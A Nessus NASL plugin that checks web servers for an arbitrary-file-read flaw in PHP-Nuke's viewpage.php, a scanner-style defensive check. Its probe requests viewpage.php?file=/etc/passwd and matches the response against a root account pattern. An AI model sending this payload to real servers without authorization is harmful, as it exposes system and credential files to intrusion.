#
# This script was written by Renaud Deraison
#

if(description)
{
 script_id(11472); 
 script_bugtraq_id(7191);

 script_version("$Revision: 1.7 $");

 name["english"] = "viewpage.php arbitrary file reading";
 script_name(english:name["english"]);
 
 desc["english"] = "
viewpage.php (part of PHP-Nuke) does not filter user-supplied
input.

As a result, an attacker may use it to read arbitrary files on
the remote host by supplying a bogus value to the 'file' parameter
of this CGI.

Solution : Do not use php-nuke.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "viewpage.php is vulnerable to an exploit which lets an attacker view any file that the cgi/httpd user has access to.";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


function check(req)
{
  req = http_get(item:req, port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if ( r == NULL ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   	security_hole(port);
	exit(0);
  }
 return(0);
}

foreach dir ( cgi_dirs() )
{
 url = string(dir, "/viewpage.php?file=/etc/passwd");
 check(req:url);
}
